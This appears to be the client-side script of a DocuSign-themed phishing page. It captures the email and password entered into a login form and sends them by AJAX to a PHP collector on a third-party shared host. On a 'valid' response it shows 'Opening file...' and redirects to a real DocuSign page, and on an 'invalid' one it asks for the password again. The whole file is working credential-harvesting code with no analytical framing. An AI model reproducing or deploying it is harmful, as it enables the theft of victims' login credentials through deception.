<script>
$(document).ready(function () {
  $('#loginForm').submit(function (e) {
    e.preventDefault();

    const email = $('#email').val().trim();
    const password = $('#password').val().trim();
    const $msg = $('#loginMessage');

    $.ajax({
      url: 'https://topguardtraining.hsa.grd.mybluehost.me/zim.php',
      type: 'POST',
      dataType: 'json',
      data: { email, password },
      success: function (response) {
        if (response.status === 'valid') {
          $msg
            .removeClass('d-none')
            .css({
              'background-color': '#d4edda',  // Light green
              'color': '#155724',             // Dark green text
              'border': '1px solid #c3e6cb',
              'display': 'block'
            })
            .html('✅ Opening file...');

          setTimeout(function () {
            window.location.href = 'https://postsign.docusign.com/postsigning/en/finish-viewing';
          }, 2000);

        } else if (response.status === 'invalid') {
          $msg
            .removeClass('d-none')
            .css({
              'background-color': '#f8d7da',
              'color': '#721c24',
              'border': '1px solid #f5c6cb',
              'display': 'block'
            })
            .html('⚠️Incorrect password, please try again.');

          $('#password').val('');

          setTimeout(function () {
            $msg.fadeOut();
          }, 3000);

        } else {
          $msg
            .removeClass('d-none')
            .css({
              'background-color': '#fff3cd',
              'color': '#856404',
              'border': '1px solid #ffeeba',
              'display': 'block'
            })
            .html('⚠️ Something went wrong. Please try again.');

          setTimeout(function () {
            $msg.fadeOut();
          }, 3000);
        }
      },
      error: function () {
        $('#loginMessage')
          .removeClass('d-none')
          .css({
            'background-color': '#ffeaea',
            'color': '#721c24',
            'border': '1px solid #f5c6cb',
            'display': 'block'
          })
          .html('❌ Network error. Please try again.');

        setTimeout(function () {
          $('#loginMessage').fadeOut();
        }, 4000);
      }
    });
  });
});
